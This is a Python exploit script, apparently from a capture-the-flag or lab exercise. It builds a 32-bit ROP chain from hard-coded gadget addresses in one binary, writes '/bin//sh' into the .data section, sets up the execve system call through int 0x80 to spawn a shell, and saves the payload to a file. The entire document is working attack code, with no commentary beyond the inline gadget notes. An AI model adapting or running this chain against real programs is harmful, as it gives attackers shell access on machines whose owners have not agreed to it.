from struct import pack
import os
data = 0x080e3020
xor_eax_eax = 0x0804e234 # xor eax, eax ; ret
pop_eax = 0x080ac96a # pop eax ; ret
pop_ebx = 0x08049022 # pop ebx ; ret
pop_ecx = 0x0807f9a3 # pop ecx ; ret
pop_edx = 0x0807f133 # pop edx ; and eax, 0xe850fffd ; ret
inc_eax = 0x0809fc6e # inc eax ; ret
int_80 = 0x080499c2 # int 0x80
mov_edx_eax = 0x0804eed2 # mov dword ptr [edx], eax ; ret
filler = 0x11111111
# Padding goes here
p = bytes('AAAAAAAABBBB', 'ascii')
 
p += pack('<I', pop_edx) # write address of .data into edx
p += pack('<I', data)
p += pack('<I', pop_eax) # write /bin into eax
p += bytes('/bin', 'ascii')
p += pack('<I', mov_edx_eax) # mov to .data
p += pack('<I', pop_edx) # address of .data + 4 into edx
p += pack('<I', data + 4)
p += pack('<I', pop_eax) # //sh into eax
p += bytes('//sh', 'ascii')
p += pack('<I', mov_edx_eax) # mov to .data
p += pack('<I', pop_edx) # address of .data + 8 into edx
p += pack('<I', data + 8)
p += pack('<I', xor_eax_eax) # clear eax
p += pack('<I', mov_edx_eax) # write null after /bin/sh
p += pack('<I', pop_ebx) # write address of program name to ebx
p += pack('<I', data)
p += pack('<I', pop_ecx) # write arguments into ecx
p += pack('<I', data + 8)
p += pack('<I', pop_edx) # write env into edx
p += pack('<I', data + 8)
p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', int_80) # call interrupt
print(str(p)[2:-1])
with open('payload', 'wb') as file:
    file.write(p)